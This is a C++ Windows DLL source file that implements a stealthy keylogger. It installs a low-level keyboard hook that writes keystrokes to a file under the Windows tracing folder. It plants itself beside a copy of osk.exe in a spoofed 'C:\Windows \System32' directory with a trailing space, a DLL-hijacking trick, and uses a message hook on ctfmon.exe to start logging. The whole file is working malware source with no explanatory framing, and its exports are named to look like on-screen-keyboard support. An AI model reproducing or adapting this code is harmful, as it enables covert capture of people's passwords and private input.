// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <string>
#include <ShellAPI.h>
#include "tlhelp32.h"

#pragma data_seg(".shared")
HINSTANCE hinst = NULL;
HHOOK keyboardHook = NULL;
HHOOK hMsgProc = NULL;
#pragma data_seg()
#pragma comment(linker, "/SECTION:.shared,RWS")

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
        FILE* fp;
        errno_t err;
        if (vkCode >= 0x0D && vkCode <= 0x87) {
            if ((err = fopen_s(&fp, "c:\\windows\\tracing\\keylog.txt", "a+")) == 0) {

                fputc(vkCode, fp);
                fclose(fp);
            }
            else {
                //OutputDebugStringA("Write to file failed");
            }
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

extern "C" __declspec(dllexport) void InitializeOSKSupport()
{
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinst, 0);
}

extern "C" __declspec(dllexport) void UninitializeOSKSupport()
{
    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
    }
}

extern "C" __declspec(dllexport) void Initialize()
{
    
    LPCWSTR szOriginalDllFileName = L"OnScreenKeylog.dll";
    LPCWSTR szMockDir = L"C:\\Windows \\System32";
    LPCWSTR szMockDllFileName = L"\\OskSupport.dll";
    LPCWSTR szOskBin = L"\\osk.exe";

    std::wstring szTmpMockDllFilePath = std::wstring(szMockDir) + szMockDllFileName;
    LPCWSTR szMockDllFilePath = szTmpMockDllFilePath.c_str();

    std::wstring szTmpMockBinFilePath = std::wstring(szMockDir) + szOskBin;
    LPCWSTR szMockBinFilePath = szTmpMockBinFilePath.c_str();

    TCHAR szOriginalDllFilePath[_MAX_PATH + 1];
    GetModuleFileName(GetModuleHandle(szOriginalDllFileName), szOriginalDllFilePath, sizeof(szOriginalDllFilePath) / sizeof(szOriginalDllFilePath[0]));
    OutputDebugString(szOriginalDllFilePath);

    if (CreateDirectory(szMockDir, NULL) ||
        ERROR_ALREADY_EXISTS == GetLastError())
    {
        
        
        CopyFile(szOriginalDllFilePath, szMockDllFilePath, FALSE);
        CopyFile(L"C:\\Windows\\System32\\osk.exe", szMockBinFilePath, FALSE);
    }
    else
    {
        // Failed to create directory.
        //OutputDebugString(L"Failed to create mock dir");
    }

    SHELLEXECUTEINFO info = { 0 };
    info.cbSize = sizeof(SHELLEXECUTEINFO);
    info.fMask = SEE_MASK_NOASYNC | SEE_MASK_NOCLOSEPROCESS;
    info.lpVerb = NULL;  
    info.lpFile = szMockBinFilePath;
    info.nShow = SW_NORMAL;

    if (!ShellExecuteEx(&info))
    {
        OutputDebugString(L"CreateProc Fail");
        exit(0);
        
    }
    
    if (info.hProcess != NULL)
    {
        ::WaitForSingleObject(info.hProcess, INFINITE);
        ::CloseHandle(info.hProcess);
    }

}
LRESULT CALLBACK GetMsgProc(
    _In_ int    code,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
) {
    if (code < 0) {
        return CallNextHookEx(hMsgProc, code, wParam, lParam);
    }

    if ((code == HC_ACTION))
    {
        MSG* pMsg = (MSG*)lParam;
        if (pMsg->message == WM_TIMECHANGE) { // detects our message, hook low-level keyboard and unhook MsgProc
            SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinst, 0);
            UnhookWindowsHookEx(hMsgProc);
        }
       
    }
    return CallNextHookEx(hMsgProc, code, wParam, lParam);
}



DWORD GetThreadID(DWORD pid) {
    HANDLE hsnap;
    THREADENTRY32 pt;
    hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    pt.dwSize = sizeof(THREADENTRY32);
    while (Thread32Next(hsnap, &pt)) {
        if (pt.th32OwnerProcessID == pid) {
            DWORD Thpid = pt.th32ThreadID;
            CloseHandle(hsnap);
            return Thpid;
        }
    };
    CloseHandle(hsnap);
    return 0;
}

DWORD getPid() {
    HANDLE hsnap;
    const wchar_t procName[] = L"ctfmon.exe";
    PROCESSENTRY32 pt;
    hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pt.dwSize = sizeof(PROCESSENTRY32);
    do {
        if (!_wcsicmp(pt.szExeFile, procName)) {
            DWORD pid = pt.th32ProcessID;
            CloseHandle(hsnap);
            return pid;
        }
    } while (Process32Next(hsnap, &pt));
    CloseHandle(hsnap);
    return 0;
}

void Loader() {
    WCHAR pathApp[1000] = { 0 };
    GetModuleFileName(NULL, pathApp, 1000);

    _wcsupr_s(pathApp);
    if (wcsstr(pathApp, L"OSK.EXE"))
    {
        DWORD pid = getPid();
        DWORD tid = GetThreadID(pid);

        if (tid != 0) {
            //HOOKPROC addr = (HOOKPROC)GetProcAddress(hinst, "MyProcedure");
            hMsgProc = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc, hinst, tid);

            // Send message to window class of ctfmon
            HWND ctfmonClass = FindWindow(L"CicLoaderWndClass", NULL);
            if (ctfmonClass) {
                PostMessage(ctfmonClass, WM_TIMECHANGE, 0, 0);
            }

            Sleep(500);
        }
        exit(0);

    }
}


BOOL APIENTRY DllMain(HINSTANCE hInstance, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        hinst = hInstance;
        Loader();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
